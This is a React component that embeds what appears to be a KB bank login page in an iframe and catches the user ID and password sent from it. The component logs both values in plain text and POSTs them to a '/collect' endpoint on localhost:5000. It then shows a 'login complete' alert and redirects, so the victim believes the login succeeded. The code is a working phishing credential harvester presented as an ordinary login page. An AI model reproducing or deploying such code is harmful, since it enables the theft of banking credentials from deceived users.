import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const NomppiKBLoginPage = () => {
  const navigate = useNavigate();

  useEffect(() => {
    const handleMessage = (event) => {
      if (event.data?.type === 'LOGIN_DATA') {
        const { userid, password } = event.data;
        console.log('✅ 로그인 수신:', userid, password);

        // 서버 저장
        fetch('http://localhost:5000/collect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({ userid, password }),
        })
          .then(() => {
            alert('로그인 완료!');
            navigate('/'); // ✅ 홈으로 이동!
          })
          .catch((err) => alert('서버 저장 실패: ' + err.message));
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [navigate]);

  return (
    <iframe
      src="/login.html"
      title="KB 로그인"
      style={{ width: '2000px', height: '800px', border: '1px solid #ccc' }}
    />
  );
};

export default NomppiKBLoginPage;
